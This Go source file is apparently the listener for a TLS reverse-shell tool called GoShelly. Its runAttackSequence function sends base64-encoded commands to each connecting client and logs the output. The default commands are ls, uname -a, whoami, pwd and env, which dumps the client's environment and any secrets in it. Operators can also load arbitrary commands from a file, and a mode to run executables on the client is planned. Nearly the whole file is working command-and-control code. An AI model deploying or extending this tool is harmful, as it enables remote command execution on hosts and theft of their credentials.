package main

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"net/mail"
	"os"
	"os/exec"

	"strconv"
	"strings"
	"time"

	"github.com/joho/godotenv"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

//file upl/downl functions, if needed
func uploadFile(conn net.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn net.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		servlog.Println("Invalid Email Address. Proceeding anyway.")
		return
	}
	servlog.Println("Email Verified. True.")
}

func sendEmail(conn net.Conn) {
	if !emailEN {
		return
	}
}

func sendSlackMessage(conn net.Conn) {
	if !slackEN {
		return
	}
}


func genCert() {

	servlog.Println("Generating SSL Certificate. Checking if email flag is present.")
	if sslEmail == "unsecure@admin.com" && os.Getenv("SSLCERTGENEMAIL_SERVER") == "" {
		servlog.Println("Both flag and env not present. Defaulting.")
	}

	if sslEmail == "unsecure@admin.com" {
		sslEmail = os.Getenv("SSLCERTGENEMAIL_SERVER")
	}

	validateMailAddress(sslEmail)
	_, err := exec.Command("/bin/bash", "./certGen.sh", sslEmail).Output()

	if err != nil {
		servlog.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
}

func readFile() []string {

	file, err := os.Open(instrfile)
	if err != nil {
		log.Panic("Failed to open file.")
		os.Exit(1)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var text []string

	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	return text
}

func handleClient(conn net.Conn) {

	file, err := os.OpenFile("./logs/"+conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	logger := log.New(file, "", log.LstdFlags)
	logger.Println("FILE BEGINS HERE.")
	logger.Println("Client connected: ", conn.RemoteAddr())
	runAttackSequence(conn, logger)
	disconnectClient(conn, logger, *file)
	sendEmail(conn)
	sendSlackMessage(conn)
}

func setReadDeadLine(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn net.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetWriteDeadline failed:", err)
	}
}

//If enable values are present as env vars, they are used.
func checkEnableFlags() {
	switch notEN {
	case "":
		servlog.Println("No enable flags provided. Checking and utilising env variables.")
		break
	case "-e":
		servlog.Println("Only email notifications enabled.")
		emailEN = true
		return
	case "-es", "-se":
		servlog.Println("Both Email and Slack notifications enabled.")
		emailEN = true
		slackEN = true
		return
	case "-s":
		servlog.Println("Only Slack notifications enabled.")
		slackEN = true
		return
	default:
		servlog.Println("Wrong enable flag provided. Please use the following list of commands to enable notifications:")
		printFlagHelp()
		os.Exit(1)
	}

	tempEmailEN, emailErr := strconv.ParseBool(os.Getenv("EMAIL_ENABLE"))
	tempSlackEN, slackErr := strconv.ParseBool(os.Getenv("SLACK_ENABLE"))

	if emailErr == nil {
		servlog.Println("Email notifcation enable env var present.")
		emailEN = tempEmailEN
	}
	if slackErr == nil {
		servlog.Println("Slack notifcation enable env var present.")
		slackEN = tempSlackEN
	}
	if slackErr != nil && emailErr != nil {
		servlog.Println("No notification env variable present, defaulting to false.")
		slackEN = false
		emailEN = false
	}

}

func printFlagHelp() {
	fmt.Println("Wrong flag. Choose from the options below.")
	fmt.Println("'e' : To enable only Email notifications.")
	fmt.Println("'s' : To enable only Email notifications.")
	fmt.Println("'es' or 'se' : To enable both Email and Slack notifications.")
	fmt.Println("To disable notifications, skip the enable flag.")
}

func checkFlags() {
	servlog.Println("Checking Input Flags")
	if len(os.Args) < 2 {
		fmt.Println("Incorrect number of input arguments.")
		os.Exit(1)
	}

	switch mode {
	case "a": //run sample commands -> echo $ARAALI_COUNT", "uname -a", "whoami", "pwd", "env"
		//cindex 2
		servlog.Println("Run default commands", cmdsToRun)
		checkEnableFlags()
	case "fe": //run commands from file
		servlog.Println("Run commands from file.")
		cmdsToRun = readFile()
		checkEnableFlags()

	//***************************************************//
	// case "-fue" yet to be implemented//
	//***************************************************//
	case "fue":
		servlog.Println("File upload execute.")
		servlog.Println("Not yet available. Stay tuned in :)")
		os.Exit(1)
	default:
		fmt.Printf("'%s' is not a listed command, please choose from the following: \n", mode)
		fmt.Println("a : Run \"echo $ARAALI_COUNT\", \"uname -a\", \"whoami\", \"pwd\", \"env\"")
		fmt.Println("fe : Run commands from the instructions file")
		fmt.Println("fue : Run an executable file on the client system")
		fmt.Println("Please use the following list of commands to enable notifications:")
		printFlagHelp()
		os.Exit(1)
	}
}

func runAttackSequence(conn net.Conn, logger *log.Logger) {
	buffer := make([]byte, 1024)
	for _, element := range cmdsToRun {
		element = strings.TrimSpace(element)
		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
		logger.Println("EXECUTE: " + element)
		setWriteDeadLine(conn)
		_, err := conn.Write([]byte(encodedStr))
		if err != nil {
			return
		}
		time.Sleep(time.Second * 2)
		setReadDeadLine(conn)
		_, err = conn.Read(buffer)
		if err != nil {
			return
		}
		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		logger.Println("RES: " + string(decodedStr[:]))
	}
}

func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
	logger.Println("\nDONE.\nFILE ENDS HERE.")
	file.Close()
	conn.Close()
}

//global variables
var help = flag.Bool("help", false, "Show flag help")
var slackEN bool
var emailEN bool
var servlog *log.Logger
var cmdsToRun []string
var instrfile string
var mode string
var l net.Listener
var notEN string
var sslEmail string

func main() {
	flag.StringVar(&notEN, "not", "", "Email and Slack notifications enable")
	flag.StringVar(&instrfile, "f", "instr.*", "Instructions filepath/filename")
	flag.StringVar(&mode, "mode", "a", "mode")
	flag.StringVar(&sslEmail, "em", "unsecure@admin.com", "SSLCERTGENEMAIL")

	// Parse the flag
	flag.Parse()

	// Usage Demo
	if *help {
		flag.Usage()
		os.Exit(0)
	}
	os.Mkdir("./logs/", os.ModePerm)
	servfile, err := os.OpenFile("./logs/"+"GoShellyServerLogs"+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Server log open error: ", err)
		return
	}

	defer servfile.Close()
	servlog = log.New(servfile, "", log.LstdFlags)
	servlog.Println("Starting GoShelly server...")

	err = godotenv.Load()
	if err != nil {
		servlog.Println("Could not open .env file.")
		return
	}
	cmdsToRun = []string{"ls", "uname -a", "whoami", "pwd", "env"}
	PORT := os.Getenv("PORT")

	genCert() //to generate SSL certificate

	checkFlags() //emailEN and slackEN values are ignored

	servlog.Println("Loading SSL Certificates")
	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")

	if err != nil {
		servlog.Printf("Error Loading Certificate: %s", err)
		return
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	config.Rand = rand.Reader
	service := "0.0.0.0:" + PORT

	l, err = tls.Listen("tcp", service, &config)
	if err != nil {
		servlog.Printf("Server Listen error: %s", err)
	}
	servlog.Println("Server Listening on port: ", PORT)

	for {
		conn, err := l.Accept()

		if err != nil {
			servlog.Printf("%s Client accept error: %s", conn.RemoteAddr(), err)
			continue
		}
		servlog.Printf("Client accepted: %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			log.Print("ok=true")
			state := tlscon.ConnectionState()
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		servlog.Println("Handling Client: ", conn.RemoteAddr())
		go handleClient(conn)
	}
}
